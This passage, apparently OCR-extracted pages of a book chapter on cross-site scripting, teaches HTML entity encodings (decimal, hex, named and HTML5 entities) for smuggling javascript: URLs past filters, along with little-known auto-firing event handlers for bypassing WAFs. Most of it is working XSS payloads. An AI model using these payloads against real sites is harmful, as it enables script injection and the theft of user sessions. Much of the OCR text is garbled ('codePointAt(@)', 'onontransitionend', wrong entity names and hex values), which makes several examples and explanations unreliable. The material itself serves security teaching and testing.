    from a null origin, it will inherit the origin from the page.


    # HTML entities


    HTML has a wide range of encoding options. In this section I''m going to go through
    the various ways you can encode characters with entities and finish off each section
    with a few examples.


    # Decimal entities


    You can use character codes to represent different characters, they are prefixed
    with &# and ends with an optional semicolon. For the character "j" is represented
    as the character 106. To produce this character we simply have to combine the
    prefix with the code, followed by an optional semicolon. You can also use many
    zeros as you like before the character code:


    ```

    1 <a href="&#106;javascript:alert(1337)">test1</a>

    2 <a href="&#106;javascript:alert(1337)">test2</a>

    3 <a href="&#x00000106;javascript:alert(1337)">test3</a>

    ```


    Converting to this format is easy just you need to loop through the characters
    and convert the character to a character code using codePointAt():


    ```

    ''j''.codePointAt(0)

    ```


    # Hex entities


    There are a lot of similarities with hex entities as decimal but there''s a slightly
    different prefix. Use &#x as the prefix and convert the character code to hex.
    The semicolon is optional again however there is an existing character that validates
    hex it is going to produce a different character so you need to ensure the character
    is not valid


    ```

    1 <a href="&#x6a;javascript:alert(1337)">test1</a>

    2 <a href="&#x6aa;javascript:alert(1337)">test2</a>

    3 <a href="&#x00000106;javascript:alert(1337)">test3</a>

    4 <a href="&#x6a*javascript:alert(1337)">test4</a>

    ```


    In the preceding code the second example will fail because "a" is valid hex and
    therefore produces a different character than the required "j". The last example
    works because "s" is not valid hex so produces the entity produces the correct
    character. To produce this encoding you just need to get the code point again
    but convert it like this:'
  merge: -1
  pgno: 73
- img_proc: true
  md: '# Chapter eight - XSS


    ''j''.codePointAt(@).toString(16)


    It''s worth noting when you have a value with a leading zero you can actual omit
    it and it will still work:


    ```

    <a href="java&xascript:alert(1)">test</a>

    ```


    # Named entities


    As you are aware HTML also supports named entities; these allow you to represent
    different characters using a specific name. The most common named entities are
    &lt; and &gt;. certain entities the semicolon is optional but it will only be
    decoded depending what the next character is.


    ```

    <a href="#" onclick="alert(title)" title="&lt;src/onerror=alert(i)&gt">test1</a>
    href="#" onclick="alert(title)" title="&lt;----&gt">test2</a>

    ```


    In the first example a bunch of new entities will be decoded but less than in
    the second example both will be. This is because the browser is expecting a semicolon
    or a continuation of the named entity, the exclamation point character will not
    result in a valid entity the browser knows that you must mean &lt;


    # HTML5 named entities


    HTML5 introduced a bunch of new entities that are useful for XSS. In order to
    use them they have to be correctly formed. That means no missing semicolon. Out
    of all the entities the &colon; is most useful since you can to inject a JavaScript
    protocol without a colon:


    ```

    <a href="javascript:colon;alert(1337)">test</a>

    ```


    Other entities are: &par;&hellip;&bol;&lsq;&rsquo;&lcub;&rc;

    &par; translates to opening parenthesis and &rarr; is a closing parenthesis. &bol;
    is a backslash character and &lsq; and &rsquo; are square brackets and &lcub;
    and &rc; are right and left curly braces. Here''s how to use the &par; and &rpar;
    entities:


    ```

    <a href="javascript:colon;amp&lt;amp&rpar;1337">test</a>

    ```


    There are entities for new line and tab which as we learned in the fuzzing chapter
    can be used inside the JavaScript protocol:'
  merge: -1
  pgno: 74
- img_proc: true
  md: '# Chapter eight - XSS


    +   1 <a href="jav&NewLine;as&Tab;crit&colon;alert&lpar;1337&rpar;">test</a>


    If you manage to sneak in a JavaScript URL but parentheses are being blocked by
    a WAF, you can use named entities for the backtick character, there are actually
    two of them which work:


    +   1 <a href="javascript:alert&grave;1337&grave;">testtest</</a>


    +   2 <a href="javascript:alert&DiacriticalGrave;133&DiacriticalGrave;">testtest</a>


    # Events


    # onafterscriptexecute


    There are many notable events that fire without user interaction and are most
    useful since you do not have to convince the victim to click anything. I''m going
    to highlight the less known events since they will be the most useful for bypassing
    filters and WAFs. The onafterscriptexecute is a Firefox only event and the name
    suggests will fire after script is executed. What''s really cool about this event
    is that it can be on any tag, the only downside is a script to be inside the tag
    you inject:


    ```

    <xss onafterscriptexecute=alert(1)"><script></script>

    ```


    You could use this to inject an opening tag and a pre-existing script be loaded
    inside it, this would be enough to fire the event. There is a related event called
    onbeforescriptexecute again which is Firefox only and requires an existing script.


    # ontoggle


    This is probably well known than the other tricks. You can get the ontoggle event
    to fire automatically if you force the details element to be expanded.


    ```

    1 <details ontoggle=alert(1) open></test</details>

    ```


    # onunhandledrejection


    This is a relatively obscure event that only works on Firefox. It requires a promise
    without a catch clause. To exploit it with you''d need an existing script that
    has an unhandled rejection.


    ```

    1 <body>onunhandledrejection=alert(1)"><script> fetch(''xyz'')</script>

    ```


    # onbegin


    SVG contains a lot of interesting events, onbegin will fire when an animation
    starts and is quite short which is always good for an XSS payload. To use it you
    have to use the animate tag and give it an attribute to animate and it''s duration:'
  merge: -1
  pgno: 75
- img_proc: true
  md: '# Chapter eight - XSS


    ```

    <svg><animate onbegin=alert(1) attributeName=x dur=1s>

    ```


    This also has a relat tag onload which fires when the animation ends. It requires
    an attribute to define its duration and an attribute to animate.


    # Navigation based events


    There are a few events you can use that require some sort of navigation to fire.
    One such event is onpoststate, which is fired when the history changes. In order
    to fire this event you have to change the URL of the target in some way. This
    most likely involves an iframe, thing worth noting that when using cross origin
    iframe alert(1) doesn''t work, you have to use the print() function instead. Here
    are some examples:


    ```

    <body>onpoststate=alert(1)<script>location.hash=1</script>

    ```


    ```

    <iframe src="//target?x=<body>/onpoststate=print()" onload=this.src%2b=''%23''>

    ```


    You can use iframes to cause modification to the hash portion of the URL to fire
    events hashchange to:


    ```

    <iframe src="//target?x=<body/onhashchange=print()" onload=this.src%2b=''%23''>

    ```


    # onmessage


    Using iframes again you can load an external URL with your injection of the onmessage
    handler and then using postMessage to fire the event:


    ```

    <iframe src="//target?x=<body/onmessage=print()" onload=this.contentWindow.postMessage(age('''',
    ''*'')''>

    ```


    # onfocus


    Usually this event can be fired using textarea or input the autofocus attribute.
    It''s possible to get this event to work on other elements by tabindexing and
    an id attribute. Tabindex is an accessibility attribute that lets you choose which
    elements on the page are selected when you press tab. By combining this with an
    id attribute and using hash from the URL it will automatically focus the element:


    ```

    <x focus=alert(1) id=x tabindex=1>

    ```


    homepage.html There''s another trick too, you can actually use the autofocus attribute
    on any element least on Chrome, provided you use the tabindex in conjunction with
    it. This means you don''t need an id attribute or a hash:'
  merge: -1
  pgno: 76
- img_proc: true
  md: '# Chapter eight - XSS


    ```

    <x autofocus=alert(1) autofocus tabindex=1>

    ```


    Similarly there is a related event called autofocus which you can use to bypass
    a WAF and have the same behaviour above.


    # Animation based events


    It''s well known that you can use CSS transitions/animations to fire events on
    any tag. If you''re not aware here how to do it:


    ```

    <style>:target{color: red;}</style>

    ```


    ```

    <x id=x style="transition:color 10s" onontransitioncancel=print()></x>

    ```


    somepage.html#x


    This works by using thetarget selector to change styles when the id specified
    in the hash portion of the URL is found. This then fires. The downside with this
    particular approach is that it creates a style block which would probably be blocked
    by a WAF or filter. There is another way, you can use the trick described earlier
    to focus the element and because Chrome adds a CSS outline to elements focused
    you can use a transition which will fire the event because the outline will:


    ```

    <x id=x style="transition:outline 1s" onontransitionend=alert(1) tabindex=1></x>

    ```


    somepage.html#x


    If you''re having trouble sneaking that event in there''s always the we variant
    you can use:


    ```

    <x id=x style="transition:outline 1s" onwebkittransitionend=alert(1) tabindex=1>\/

    x>

    ```


    somepage.html#x


    # Summary


    We covered a lot in this chapter. I basically tried to do a brain dump of obscure
    tricks I could think of or answers to questions I''ve been asked on Twitter. First
    covered how to close scripts without a closing tag. Then covered to abuse HTML
    contents inside scripts, HTML entities including SVG, how to abuse payloads and
    cookies. We learned how to use sources to send a pingback to an attacker controlled
    server. After that we demonstrated a new JavaScript function called navigate that
    works in Chrome. We covered all the comments in JavaScript and the whitespaces
    later. Later we showed how to use dynamic imports with data URLs. Afterward we
    covered how to get HTML inside an XML document. Then we showed how to use SVG
    objects and use elements. After that we covered HTML entities and finally finished
    off with some less known JavaScript events.'
  merge: -1
  pgno: 77
